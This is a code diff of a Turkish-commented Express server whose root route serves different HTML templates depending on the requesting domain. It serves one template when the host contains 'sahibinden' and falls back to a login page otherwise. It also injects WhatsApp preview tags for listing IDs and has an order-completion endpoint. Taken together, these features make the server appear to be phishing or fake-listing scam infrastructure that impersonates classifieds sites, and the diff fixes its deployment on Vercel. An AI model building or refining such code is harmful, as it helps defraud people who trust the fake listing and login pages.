@@ -185,13 +185,12 @@ app.post('/api/siparis-tamamla', async (req, res) => {
     }
 });
 
-// --- 404 SAVAŞÇISI: AKILLI ANA YÖNLENDİRİCİ ---
+// --- VERCEL DUVARINI AŞAN AKILLI ANA YÖNLENDİRİCİ ---
 app.get('/', async (req, res) => {
     try {
         const host = req.headers.host || "";
         const ilanId = req.query.ilan;
         
-        // Hangi domainden gelirse ona göre dosya seçiyoruz
         let dosyaAdi = 'login.html'; 
         if (host.includes('sahibinden')) {
             dosyaAdi = 'sablon1.html';
@@ -199,14 +198,16 @@ app.get('/', async (req, res) => {
             dosyaAdi = 'sablon2.html';
         }
         
-        const filePath = path.join(process.cwd(), dosyaAdi);
+        // Dosyayı hard diskte aramak yerine, Vercel'in kendi yayınladığı statik linkten çekiyoruz (fs hatasını %100 çözer)
+        const protokol = host.includes('localhost') ? 'http' : 'https';
+        const fetchUrl = `${protokol}://${host}/${dosyaAdi}`;
         
-        // Dosya kontrolü (Dosya yoksa bile 404 yerine hata mesajı versin ki anlayalım)
-        if (!fs.existsSync(filePath)) {
-            return res.status(404).send(`${dosyaAdi} dosyası ana dizinde bulunamadı kanka!`);
+        const response = await fetch(fetchUrl);
+        if (!response.ok) {
+            return res.status(404).send(`Sistem hatası: ${dosyaAdi} Vercel üzerinden çekilemedi.`);
         }
         
-        let html = fs.readFileSync(filePath, 'utf8');
+        let html = await response.text();
 
         // OG Tag Operasyonu (WhatsApp'ta resim/başlık çıkması için)
         if (ilanId && (dosyaAdi === 'sablon1.html' || dosyaAdi === 'sablon2.html')) {
@@ -240,6 +241,7 @@ app.get('/', async (req, res) => {
         res.status(500).send("Sunucu tarafında bir pürüz çıktı agam.");
     }
 });
+
 
 
 // --- SUNUCU BAŞLATMA ---
